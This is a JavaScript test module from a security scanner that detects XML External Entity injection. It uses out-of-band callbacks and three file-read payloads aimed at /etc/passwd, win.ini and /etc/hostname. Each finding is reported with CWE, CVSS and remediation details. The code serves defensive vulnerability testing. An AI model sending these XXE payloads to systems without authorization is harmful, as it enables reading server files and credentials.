// backend/src/tests/xxeTest.js
// XML External Entity (XXE) injection detection via OAST callbacks
import axios from 'axios';

const XXE_CONTENT_TYPES = ['application/xml', 'text/xml', 'application/soap+xml',
    'application/xhtml+xml', 'multipart/form-data'];

const XXE_ENDPOINTS = ['/api', '/upload', '/import', '/parse', '/feed', '/rss',
    '/soap', '/xml', '/data', '/webhook', '/callback'];

export async function testXXE(endpoint, options = {}) {
    const findings = [];
    const oastClient = options.oastClient || null;
    const timeout = options.timeout || 10000;

    // Test 1: OAST-based XXE (blind)
    if (oastClient) {
        const result = await oastClient.injectAndVerify({
            testType: 'xxe',
            context: `endpoint:${endpoint.url}`,
            injector: async (oast) => {
                for (const [name, payload] of Object.entries(oast.payloads)) {
                    try {
                        await axios.post(endpoint.url, payload, {
                            timeout,
                            headers: { 'Content-Type': 'application/xml' },
                            validateStatus: () => true
                        });
                    } catch { /* continue */ }
                    try {
                        await axios.post(endpoint.url, payload, {
                            timeout,
                            headers: { 'Content-Type': 'text/xml' },
                            validateStatus: () => true
                        });
                    } catch { /* continue */ }
                }
            },
            timeout: 20000
        });

        if (result) {
            findings.push({
                assetId: endpoint.assetId, endpointId: endpoint.id,
                title: 'XML External Entity (XXE) Injection',
                description: `Endpoint accepts XML input and processes external entities. Confirmed via OAST callback — the server fetched our external DTD/entity.`,
                category: 'XXE', severity: 'CRITICAL', cvss: 9.1, owasp: 'A05:2021', cwe: 'CWE-611',
                remediation: 'Disable external entity processing in XML parsers. Use JSON instead of XML where possible. Set XMLReader features to disallow DTDs and external entities.',
                references: ['https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)'],
                detectedBy: 'xxe-engine', confidence: 98,
                evidence: result.evidence
            });
            return findings;
        }
    }

    // Test 2: Error-based XXE (file read attempt)
    const fileReadPayloads = [
        { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', file: '/etc/passwd', indicator: 'root:' },
        { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', file: 'win.ini', indicator: '[fonts]' },
        { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', file: '/etc/hostname', indicator: '' }
    ];

    for (const { payload, file, indicator } of fileReadPayloads) {
        try {
            const resp = await axios.post(endpoint.url, payload, {
                timeout,
                headers: { 'Content-Type': 'application/xml' },
                validateStatus: () => true
            });

            const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

            if (indicator && body.includes(indicator)) {
                findings.push({
                    assetId: endpoint.assetId, endpointId: endpoint.id,
                    title: 'XML External Entity (XXE) — File Read',
                    description: `Endpoint processes XML external entities. Server-side file ${file} content was included in the response.`,
                    category: 'XXE', severity: 'CRITICAL', cvss: 9.1, owasp: 'A05:2021', cwe: 'CWE-611',
                    remediation: 'Disable external entity processing. Use JSON APIs. Configure XML parsers securely.',
                    detectedBy: 'xxe-engine', confidence: 97,
                    evidence: [
                        { type: 'PAYLOAD', title: 'XXE Payload', content: `File Target: ${file}\nPayload:\n${payload}` },
                        { type: 'RESPONSE', title: 'File Content Leaked', content: `Status: ${resp.status}\nBody: ${body.substring(0, 500)}` }
                    ]
                });
                break;
            }

            // Check for XML parsing errors (indicates XML is processed)
            const xmlErrors = [/xml parsing error/i, /SAXParseException/i, /XMLSyntaxError/i, /not well-formed/i];
            if (xmlErrors.some(p => p.test(body))) {
                findings.push({
                    assetId: endpoint.assetId, endpointId: endpoint.id,
                    title: 'Possible XXE — XML Parser Detected',
                    description: `Endpoint processes XML input. XML parsing errors indicate DTD processing may be enabled. Further testing recommended.`,
                    category: 'XXE', severity: 'MEDIUM', cvss: 5.3, owasp: 'A05:2021', cwe: 'CWE-611',
                    remediation: 'Disable external entity and DTD processing in XML parser configuration.',
                    detectedBy: 'xxe-engine', confidence: 60,
                    evidence: [
                        { type: 'PAYLOAD', title: 'XXE Probe', content: payload },
                        { type: 'RESPONSE', title: 'XML Error Detected', content: `Status: ${resp.status}\nXML parsing error found in response` }
                    ]
                });
                break;
            }
        } catch { /* continue */ }
    }

    return findings;
}

export default testXXE;
